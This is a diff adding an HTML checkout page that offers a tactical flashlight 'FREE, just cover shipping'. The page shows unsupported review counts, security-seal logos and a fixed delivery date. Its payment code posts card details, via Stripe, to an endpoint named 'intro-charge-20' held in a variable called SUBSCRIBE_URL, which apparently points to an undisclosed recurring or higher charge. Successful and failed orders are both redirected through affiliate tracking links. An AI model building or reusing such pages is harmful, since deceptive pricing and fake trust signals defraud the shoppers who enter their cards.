@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>Solforce Tactical Flashlight – Checkout</title>
+
+  <!-- ✅ GoAffPro loader: load first, once -->
+  <script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+
+  <!-- (Optional) Tiny safety shim: capture ?ref= early and persist as a cookie for 90 days -->
+  <script>
+    (function () {
+      try {
+        var u = new URL(window.location.href);
+        var ref = u.searchParams.get('ref'); // add other param names here if you use custom ones
+        if (ref) {
+          var days = 90, d = new Date();
+          d.setTime(d.getTime() + days*24*60*60*1000);
+          document.cookie = "goaffpro_ref=" + encodeURIComponent(ref) + "; path=/; expires=" + d.toUTCString();
+          // Clean the URL so ref isn't duplicated on form posts
+          u.searchParams.delete('ref');
+          history.replaceState(null, "", u.toString());
+        }
+      } catch (e) {}
+    })();
+  </script>
+
+  <!-- Google tag (unchanged) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);} 
+    gtag('js', new Date());
+    gtag('config', 'G-FDQ6REQWS8', { send_page_view: true });
+  </script>
+
+  <style>
+    :root{
+      --blue:#1f9bf0; --green:#2bb24c; --green-dark:#1d9a3b; --text:#26364d; --muted:#5c6d82; --line:#dae2ee; --card:#ffffff;
+      --accent:#19b57b; --warn:#c21e1e; --shadow:0 8px 22px rgba(10,31,68,.08);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{margin:0;background:#f5f8fb;color:var(--text);font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
+
+    /* header bars */
+    .topbar{background:var(--blue);color:#fff;text-align:center;font-weight:700;font-size:14px;padding:8px 10px}
+    .greenbar{background:#23a33b;color:#fff;text-align:center;font-weight:800;padding:10px;border-radius:4px;margin:10px 0}
+
+    .wrap{max-width:1120px;margin:0 auto;padding:14px}
+    .hero{text-align:center;margin:10px auto 8px}
+    .hero h1{margin:10px 0 6px;font-size:22px;font-weight:900}
+    .hero p{margin:6px 0;color:#0e8a2b;font-weight:900;letter-spacing:.2px}
+    .subline{font-size:12px;color:#6b7b90}
+    .stars{color:#f7b500;margin-left:6px}
+
+    /* main grid: left = order, right = form (which itself has two columns) */
+    .grid{display:grid;grid-template-columns:320px 1fr;gap:22px;align-items:start}
+    @media (max-width:980px){.grid{grid-template-columns:1fr}}
+
+    .order{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:18px;box-shadow:var(--shadow)}
+    .order h3{margin:0 0 8px;font-size:20px;font-weight:900;color:#22324a}
+    .order table{width:100%;border-collapse:collapse;font-size:14px}
+    .order td{padding:6px 0;border-top:1px dashed #e3e9f2}
+    .order tr:first-child td{border-top:none}
+    .order .strike{color:#a8b5c6;text-decoration:line-through}
+    .order .total{font-weight:900}
+    .order .img{margin-top:12px;text-align:center}
+    .order .img img{max-width:100%;height:auto}
+
+    .formWrap{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:18px;box-shadow:var(--shadow)}
+    .twoCol{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+    @media (max-width:780px){.twoCol{grid-template-columns:1fr}}
+
+    .sectionTitle{display:flex;align-items:center;gap:10px;margin:2px 0 6px}
+    .badge{width:32px;height:32px;border-radius:50%;display:inline-grid;place-items:center;background:#20324d;color:#fff;font-weight:900}
+    .sectionTitle h4{margin:0;font-size:18px;font-weight:900;color:#20324d}
+
+    .label{font-size:13px;font-weight:800;color:#31425a;margin:6px 0 6px}
+    .input,.select,.el{width:100%;border:1px solid #cfd7e5;border-radius:6px;padding:10px 12px;font-size:15px;outline:none;background:#fff}
+    .select{appearance:none;background-image:linear-gradient(45deg,transparent 50%,#6b7b90 50%),linear-gradient(135deg,#6b7b90 50%,transparent 50%);background-position:calc(100% - 16px) calc(50% + 3px),calc(100% - 11px) calc(50% + 3px);background-size:5px 5px,5px 5px;background-repeat:no-repeat}
+
+    .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    .row-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
+    @media (max-width:640px){.row,.row-3{grid-template-columns:1fr}}
+
+    .ok{position:relative}
+    .ok:after{content:"✔";position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#19b57b;font-weight:900}
+
+    .paybtn{background:#2bb24c;border:none;border-bottom:3px solid #19933b;color:#fff;font-weight:1000;font-size:18px;border-radius:6px;padding:12px 18px;width:100%;cursor:pointer}
+    .paybtn:active{transform:translateY(1px)}
+
+    .ssl{display:flex;align-items:center;gap:8px;color:#6c7a8e;font-size:13px;margin:10px 0 0}
+    .est{color:#0074d9;font-size:13px;font-weight:800;margin-top:8px}
+
+    .logos{display:flex;flex-wrap:wrap;gap:16px;align-items:center;margin-top:12px}
+    .logos img{height:24px}
+
+    .err{display:none;background:#fff1f1;border:1px solid #f2bcbc;color:#842525;padding:10px;border-radius:8px;font-size:14px;margin-top:10px}
+    .err[aria-hidden="false"]{display:block}
+
+    /* Stripe element skin */
+    .el{padding:11px 12px;border-radius:6px;border:1px solid #cfd7e5}
+
+    /* loading overlay */
+    .overlay{position:fixed;inset:0;background:rgba(250,253,255,.92);display:none;align-items:center;justify-content:center;z-index:9999}
+    .overlay[aria-hidden="false"]{display:flex}
+    .loader{background:#fff;border:1px solid #e6edf5;border-radius:10px;padding:18px;width:min(92vw,440px);text-align:center;box-shadow:var(--shadow)}
+    .barWrap{height:10px;background:#eef3f9;border-radius:9999px;overflow:hidden}
+    .bar{height:100%;width:0;background:linear-gradient(90deg,#77a7ff,#2dd4bf);animation:grow 2s ease-in-out infinite}
+    @keyframes grow{0%{width:0}60%{width:80%}100%{width:100%}}
+  </style>
+</head>
+<body>
+  <div class="topbar">New and Improved 2025 Model</div>
+
+  <div class="wrap">
+    <div class="hero">
+      <h1>Get Your <strong>Solforce Tactical Flashlight</strong> Today</h1>
+      <div class="subline">Normally <span class="strike">$185.69</span>, Now Available <b>FREE</b><br/><span style="color:#13a34b;font-weight:1000">JUST COVER SHIPPING</span></div>
+      <div class="subline">✔ 2200+ verified reviews and <span class="stars">★★★★★</span> Stars</div>
+      <div class="greenbar">FREE Product Discount Activated</div>
+    </div>
+
+    <div class="grid">
+      <!-- LEFT: ORDER SUMMARY -->
+      <aside class="order">
+        <h3>Your Order</h3>
+        <table>
+          <tr><td>Item</td><td style="text-align:right">Price</td></tr>
+          <tr>
+            <td>Solforce Tactical Flashlight</td>
+            <td style="text-align:right"><span class="strike">$185.69</span></td>
+          </tr>
+          <tr>
+            <td>Shipping &amp; Handling</td>
+            <td style="text-align:right">$9.95</td>
+          </tr>
+          <tr>
+            <td class="total">Total:</td>
+            <td class="total" style="text-align:right">$9.95</td>
+          </tr>
+        </table>
+        <div class="img">
+          <img id="productImg" src="light.png" alt="Tactical Flashlight"/>
+        </div>
+      </aside>
+
+      <!-- RIGHT: SHIPPING + PAYMENT (side-by-side like screenshot) -->
+      <div class="formWrap">
+        <div class="twoCol">
+          <!-- Shipping Information -->
+          <section>
+            <div class="sectionTitle"><div class="badge">1</div><h4>Shipping Information</h4></div>
+
+            <div class="row">
+              <div>
+                <div class="label">First Name</div>
+                <input id="firstName" class="input" autocomplete="given-name"/>
+              </div>
+              <div>
+                <div class="label">Last Name</div>
+                <input id="lastName" class="input" autocomplete="family-name"/>
+              </div>
+            </div>
+
+            <div>
+              <div class="label">Email Address</div>
+              <input id="emailInput" class="input" type="email" autocomplete="email"/>
+            </div>
+
+            <div>
+              <div class="label">Phone</div>
+              <div class="row">
+                <select id="phonePrefix" class="select"></select>
+                <input id="phoneNumber" class="input" inputmode="tel" autocomplete="tel-national" placeholder=""/>
+              </div>
+            </div>
+
+            <div class="ok">
+              <div class="label">Country</div>
+              <select id="billingCountry" class="select"></select>
+            </div>
+
+            <div>
+              <div class="label">Shipping Address</div>
+              <input id="billingStreet" class="input" autocomplete="address-line1"/>
+            </div>
+            <div>
+              <div class="label">Apartment, suite, etc. (optional)</div>
+              <input id="billingStreet2" class="input" autocomplete="address-line2"/>
+            </div>
+
+            <div class="row-3">
+              <div>
+                <div class="label">Zip Code</div>
+                <input id="billingPostcode" class="input" autocomplete="postal-code"/>
+              </div>
+              <div>
+                <div class="label">City</div>
+                <input id="billingCity" class="input" autocomplete="address-level2"/>
+              </div>
+              <div>
+                <div class="label">Select State</div>
+                <input id="billingState" class="input" autocomplete="address-level1"/>
+              </div>
+            </div>
+
+            <!-- Hidden full name used by Atlas2 payment code -->
+            <input id="nameInput" style="display:none"/>
+          </section>
+
+          <!-- Payment Information -->
+          <section>
+            <div class="sectionTitle"><div class="badge">2</div><h4>Payment Information</h4></div>
+
+            <div>
+              <div class="label">Card number</div>
+              <div id="card-number" class="el"></div>
+            </div>
+
+            <div class="row">
+              <div>
+                <div class="label">Month</div>
+                <div id="card-expiry" class="el"></div>
+              </div>
+              <div>
+                <div class="label">Year</div>
+                <!-- This is just a visual split; Stripe's expiry field above handles both -->
+                <div class="el" style="opacity:.55;display:grid;place-items:center">Handled by expiry</div>
+              </div>
+            </div>
+
+            <div>
+              <div class="label">CVV <a href="#" style="font-size:12px;margin-left:8px">What is this?</a></div>
+              <div id="card-cvc" class="el"></div>
+            </div>
+
+            <div id="err" class="err" role="alert" aria-hidden="true"></div>
+
+            <button id="payNow" class="paybtn" style="margin-top:10px">ORDER NOW</button>
+
+            <div class="ssl">🔒 This is a 256-Bit Secured SSL Connection</div>
+            <div class="est">Your Order is Estimated to be Delivered by <span id="etaDate">Tuesday, September 23, 2025</span></div>
+
+            <div class="logos">
+              <img src="usps.png" alt="USPS">
+              <img src="mastercard.png" alt="Mastercard">
+              <img src="amex.png" alt="Amex">
+              <img src="mcafee.png" alt="McAfee">
+              <img src="discover.jpg" alt="Discover">
+              <img src="norton.png" alt="Norton">
+              <img src="visa.png" alt="Visa">
+            </div>
+          </section>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Loading overlay -->
+  <div id="loading-overlay" class="overlay" aria-hidden="true" style="display:none">
+    <div class="loader">
+      <div style="font-weight:900;margin-bottom:8px">Processing your payment…</div>
+      <div class="barWrap"><div class="bar"></div></div>
+      <div class="subline" style="margin-top:10px">Please wait, this may take a few seconds.</div>
+    </div>
+  </div>
+
+  <!-- Stripe.js -->
+  <script src="https://js.stripe.com/v3"></script>
+  <script>
+    window.addEventListener('DOMContentLoaded', () => {
+      // DOM refs
+      const errBox = document.getElementById('err');
+      const overlay = document.getElementById('loading-overlay');
+      const showLoading = ()=>{overlay.style.display='flex';overlay.setAttribute('aria-hidden','false')};
+      const hideLoading = ()=>{overlay.setAttribute('aria-hidden','true');overlay.style.display='none'};
+
+      const firstName = document.getElementById('firstName');
+      const lastName  = document.getElementById('lastName');
+      const nameInput = document.getElementById('nameInput');
+      const emailInput = document.getElementById('emailInput');
+
+      const phonePrefix = document.getElementById('phonePrefix');
+      const phoneNumber = document.getElementById('phoneNumber');
+
+      const billingStreet = document.getElementById('billingStreet');
+      const billingCity = document.getElementById('billingCity');
+      const billingCountrySel = document.getElementById('billingCountry');
+      const billingPostcode = document.getElementById('billingPostcode');
+
+      // ====== Keep Atlas2 endpoints/keys EXACT ======
+      const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
+      const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+
+      // ===== Country + calling codes =====
+      const COUNTRIES = [
+        ['US','United States','+1'],['CA','Canada','+1'],['GB','United Kingdom','+44'],['IE','Ireland','+353'],
+        ['AU','Australia','+61'],['NZ','New Zealand','+64'],['DE','Germany','+49'],['FR','France','+33'],['ES','Spain','+34'],
+        ['IT','Italy','+39'],['NL','Netherlands','+31'],['BE','Belgium','+32'],['SE','Sweden','+46'],['NO','Norway','+47'],
+        ['DK','Denmark','+45'],['FI','Finland','+358'],['PT','Portugal','+351'],['PL','Poland','+48'],['CZ','Czechia','+420'],
+        ['AT','Austria','+43'],['CH','Switzerland','+41'],['BR','Brazil','+55'],['MX','Mexico','+52'],['AR','Argentina','+54'],
+        ['CL','Chile','+56'],['CO','Colombia','+57'],['ZA','South Africa','+27'],['IN','India','+91'],['JP','Japan','+81'],
+        ['KR','South Korea','+82'],['SG','Singapore','+65'],['MY','Malaysia','+60'],['TH','Thailand','+66'],['VN','Vietnam','+84']
+      ];
+      function populateCountries(){
+        billingCountrySel.innerHTML='';
+        COUNTRIES.forEach(([iso,name,code])=>{
+          billingCountrySel.append(new Option(name, iso));
+          phonePrefix.append(new Option(`${code} — ${name}`, code));
+        });
+        billingCountrySel.value='US';
+        phonePrefix.value='+1';
+      }
+      populateCountries();
+
+      // URL prefill (kept compatible with atlas2)
+      const qs = new URLSearchParams(location.search);
+      const map = { first:'sub3', last:'sub4', street:'sub5', post:'sub6', city:'sub7', country:'sub8', email:'sub9', phone:'sub10' };
+      function dec(v){ try{return decodeURIComponent(v||'');}catch{return v||''} }
+      if (qs.get(map.first)) firstName.value = dec(qs.get(map.first));
+      if (qs.get(map.last))  lastName.value  = dec(qs.get(map.last));
+      if (qs.get(map.email)) emailInput.value = dec(qs.get(map.email));
+      if (qs.get(map.street)) billingStreet.value = dec(qs.get(map.street));
+      if (qs.get(map.post))   billingPostcode.value = dec(qs.get(map.post));
+      if (qs.get(map.city))   billingCity.value = dec(qs.get(map.city));
+      if (qs.get(map.country)){
+        const iso = dec(qs.get(map.country)).toUpperCase();
+        if (COUNTRIES.find(c=>c[0]===iso)) billingCountrySel.value = iso;
+      }
+      if (qs.get(map.phone)){
+        const raw = dec(qs.get(map.phone)).replace(/[^\d+]/g,'');
+        if (raw.startsWith('+')){
+          const m = raw.match(/^(\+\d{1,4})(\d{4,15})$/); if (m){ phonePrefix.value=m[1]; phoneNumber.value=m[2]; }
+        } else { phoneNumber.value = raw }
+      }
+
+      // Build full name (as in Atlas2)
+      function buildName(){ return [firstName.value,lastName.value].filter(Boolean).join(' ').trim(); }
+
+      // ===== Stripe Elements (kept) =====
+      let stripe, elements, cardNumber, cardExpiry, cardCvc;
+      try {
+        stripe = Stripe(PUBLISHABLE_KEY);
+        elements = stripe.elements();
+        cardNumber = elements.create('cardNumber');
+        cardExpiry = elements.create('cardExpiry');
+        cardCvc    = elements.create('cardCvc');
+        cardNumber.mount('#card-number');
+        cardExpiry.mount('#card-expiry');
+        cardCvc.mount('#card-cvc');
+      } catch (e) { console.warn('Stripe init skipped', e); }
+
+      // ===== Pay flow (EXACT Atlas2 logic) =====
+      document.getElementById('payNow')?.addEventListener('click', async () => {
+        if(!stripe){ alert('Payments unavailable, please try again shortly.'); return; }
+        nameInput.value = buildName();
+        const name = nameInput.value;
+        const email = emailInput.value.trim();
+        const fullPhone = ((phonePrefix?.value||'') + (phoneNumber?.value||'').replace(/[^0-9]/g,'')) || undefined;
+
+        const address = {
+          line1: billingStreet.value || undefined,
+          city: billingCity.value || undefined,
+          country: (billingCountrySel.value || undefined),
+          postal_code: billingPostcode.value || undefined
+        };
+
+        errBox.textContent=''; errBox.setAttribute('aria-hidden','true');
+        showLoading();
+        try{
+          const pmRes = await stripe.createPaymentMethod({
+            type:'card',
+            card:cardNumber,
+            billing_details:{ name:name||undefined, email:email||undefined, phone:fullPhone, address }
+          });
+          if(pmRes.error) throw new Error(pmRes.error.message);
+
+          const resp = await fetch(SUBSCRIBE_URL,{
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ paymentMethodId: pmRes.paymentMethod.id, name, email, phone:fullPhone, address })
+          });
+          const data = await resp.json();
+          if(!data.clientSecret) throw new Error(data.error || 'Payment failed to start');
+
+          const conf = await stripe.confirmCardPayment(data.clientSecret);
+          if(conf.error) throw new Error(conf.error.message);
+          if(!(conf.paymentIntent && conf.paymentIntent.status==='succeeded')) throw new Error('Payment not completed');
+
+          // Success redirect (kept from Atlas2)
+          (function(){
+            const TRACKER_URL = 'https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8eaa-1a0228d7d2e7'.replace('1a0228d7d2e7','1a0228d7d2e7'); // no-op safety
+            const pid = (conf && conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';
+            const qp = new URLSearchParams(pid ? { v: pid } : { t: String(Date.now()) });
+            try{
+              const ck = document.cookie.match(/(?:^|; )aff_sub_id=([^;]*)/); const sub = ck ? decodeURIComponent(ck[1]) : (localStorage.getItem('aff_sub_id') || '');
+              if (sub) { ['sub_id','subid','aff_sub','click_id','cid','tid'].forEach(k=>qp.set(k,sub)); }
+            }catch(e){}
+            const sep = TRACKER_URL.includes('?') ? '&' : '?';
+            window.location.href = TRACKER_URL + sep + qp.toString();
+          })();
+        }catch(err){
+          errBox.textContent = err.message || 'Something went wrong.'; errBox.setAttribute('aria-hidden','false');
+          hideLoading();
+          // Failure redirect (kept from Atlas2)
+          window.location.href = 'https://track.crugate.info/214a2787-4e13-47d7-8eaa-3e8c7caeb599';
+        }
+      });
+    });
+  </script>
+
+  <!-- (Removed duplicate GoAffPro loader that was here) -->
+</body>
+</html>
